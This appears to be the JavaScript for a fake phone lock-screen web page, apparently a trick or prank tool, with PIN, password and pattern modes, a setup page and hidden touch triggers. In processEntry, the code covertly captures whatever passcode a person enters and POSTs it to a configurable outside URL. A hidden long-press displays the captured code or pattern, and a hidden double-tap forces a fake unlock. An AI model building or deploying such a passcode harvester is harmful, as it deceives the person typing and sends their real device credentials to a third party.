let attemptCount = 0;
let forceSuccess = false;
let currentInput = "";
let peekData = null;
let lastTap = 0;
let holdTimer;

const config = {
    mode: "pin4",
    successAt: 1,
    peekAt: 1,
    sendAt: 1,
    url: "YOUR_URL_HERE"
};

window.onload = () => {
    const saved = localStorage.getItem('lockscreen_settings');
    if (saved) {
        const data = JSON.parse(saved);
        Object.assign(config, data);
        document.getElementById('lock-type').value = config.mode;
        document.getElementById('success-try').value = config.successAt;
        document.getElementById('peek-try').value = config.peekAt;
        document.getElementById('send-try').value = config.sendAt;
        document.getElementById('script-url').value = config.url;
    }
    updateTime();
    setInterval(updateTime, 10000);
};

document.getElementById('start-app').addEventListener('click', () => {
    config.mode = document.getElementById('lock-type').value;
    config.successAt = parseInt(document.getElementById('success-try').value);
    config.peekAt = parseInt(document.getElementById('peek-try').value);
    config.sendAt = parseInt(document.getElementById('send-try').value);
    config.url = document.getElementById('script-url').value;
    
    localStorage.setItem('lockscreen_settings', JSON.stringify(config));
    document.getElementById('setup-page').classList.add('hidden');
    document.getElementById('lock-page').classList.remove('hidden');
    initLockMode();
});

function initLockMode() {
    if (config.mode.includes('pin')) {
        const dots = config.mode === 'pin4' ? 4 : 6;
        document.getElementById('pin-dots').innerHTML = '<div class="dot"></div>'.repeat(dots);
        document.getElementById('pin-dots').classList.remove('hidden');
        document.getElementById('pin-pad').classList.remove('hidden');
    } else if (config.mode === 'password') {
        document.getElementById('password-tap-zone').classList.remove('hidden');
        const input = document.getElementById('hidden-pass-input');
        input.addEventListener('keydown', (e) => { if(e.key === 'Enter') processEntry(input.value); });
    } else {
        document.getElementById('pattern-canvas').classList.remove('hidden');
        drawDots(); 
    }
}

// Secret Trigger Logic (Both Lock and Home)
const triggers = ['secret-trigger-lock', 'secret-trigger-home'];
triggers.forEach(id => {
    const el = document.getElementById(id);
    const peekEl = id === 'secret-trigger-lock' ? 'peek-display' : 'peek-display-home';
    
    el.addEventListener('contextmenu', e => e.preventDefault());
    el.addEventListener('touchstart', e => {
        const now = Date.now();
        if (now - lastTap < 300) {
            forceSuccess = !forceSuccess;
            navigator.vibrate(20);
            document.getElementById('active-dot').style.opacity = forceSuccess ? 0.8 : 0;
        }
        lastTap = now;
        holdTimer = setTimeout(() => {
            drawPeek(peekEl);
            document.getElementById(peekEl).classList.remove('hidden');
        }, 1500);
    });
    el.addEventListener('touchend', () => {
        clearTimeout(holdTimer);
        document.getElementById(peekEl).classList.add('hidden');
    });
});

// Pattern Drawing Logic
const canvas = document.getElementById('pattern-canvas');
const ctx = canvas.getContext('2d');
const dots = [];
let currentPattern = [];
for (let i = 0; i < 3; i++) for (let j = 0; j < 3; j++) dots.push({ x: j * 100 + 50, y: i * 100 + 50, id: i * 3 + j });

function drawDots() {
    ctx.clearRect(0, 0, 300, 300);
    ctx.strokeStyle = "white"; ctx.lineWidth = 4;
    if (currentPattern.length > 0) {
        ctx.beginPath();
        ctx.moveTo(dots[currentPattern[0]].x, dots[currentPattern[0]].y);
        currentPattern.forEach(id => ctx.lineTo(dots[id].x, dots[id].y));
        ctx.stroke();
    }
    dots.forEach(d => {
        ctx.beginPath(); ctx.arc(d.x, d.y, 10, 0, Math.PI*2);
        ctx.fillStyle = currentPattern.includes(d.id) ? "white" : "rgba(255,255,255,0.3)";
        ctx.fill();
    });
}

canvas.addEventListener('touchmove', (e) => {
    const rect = canvas.getBoundingClientRect();
    const x = e.touches[0].clientX - rect.left;
    const y = e.touches[0].clientY - rect.top;
    dots.forEach(d => {
        if(Math.sqrt((x-d.x)**2 + (y-d.y)**2) < 30 && !currentPattern.includes(d.id)) {
            currentPattern.push(d.id);
            navigator.vibrate(10);
        }
    });
    drawDots();
});

canvas.addEventListener('touchend', () => {
    if(currentPattern.length > 1) processEntry(currentPattern.join('-'), true);
    currentPattern = []; drawDots();
});

// Core Processing
function processEntry(val, isPattern = false) {
    attemptCount++;
    if (attemptCount === config.peekAt) peekData = isPattern ? val.split('-').map(Number) : val;
    if (!isPattern && attemptCount === config.sendAt && config.url) {
        fetch(config.url, {method: 'POST', mode: 'no-cors', body: JSON.stringify({passcode: val})});
    }

    if (attemptCount === config.successAt || forceSuccess) {
        document.getElementById('unlock-sound').play();
        document.getElementById('lock-page').classList.add('hidden');
        document.getElementById('home-page').classList.remove('hidden');
    } else {
        document.getElementById('lock-content').classList.add('shake');
        navigator.vibrate([50, 50, 50]);
        setTimeout(() => document.getElementById('lock-content').classList.remove('shake'), 400);
        currentInput = "";
        document.querySelectorAll('.dot').forEach(d => d.classList.remove('filled'));
        document.getElementById('hidden-pass-input').value = "";
    }
}

document.querySelectorAll('.num').forEach(btn => {
    btn.addEventListener('click', () => {
        currentInput += btn.innerText;
        const dot = document.querySelectorAll('.dot')[currentInput.length - 1];
        if (dot) dot.classList.add('filled');
        const limit = config.mode === 'pin4' ? 4 : 6;
        if (currentInput.length === limit) setTimeout(() => processEntry(currentInput), 200);
    });
});

function drawPeek(targetCanvasId) {
    const pCanvas = document.getElementById(targetCanvasId);
    const pCtx = pCanvas.getContext('2d');
    pCtx.clearRect(0, 0, 80, 80);
    if (!peekData) return;

    pCtx.fillStyle = "white";
    if (Array.isArray(peekData)) {
        pCtx.strokeStyle = "white"; pCtx.lineWidth = 2;
        pCtx.beginPath();
        peekData.forEach((id, i) => {
            const x = (id % 3) * 20 + 20; const y = Math.floor(id / 3) * 20 + 20;
            if(i === 0) pCtx.moveTo(x,y); else pCtx.lineTo(x,y);
        });
        pCtx.stroke();
    } else {
        pCtx.font = "bold 18px Arial"; pCtx.fillText(peekData, 10, 45);
    }
}

function updateTime() {
    const now = new Date();
    const timeStr = now.getHours() + ":" + now.getMinutes().toString().padStart(2, '0');
    document.querySelector('.clock').innerText = timeStr;
}
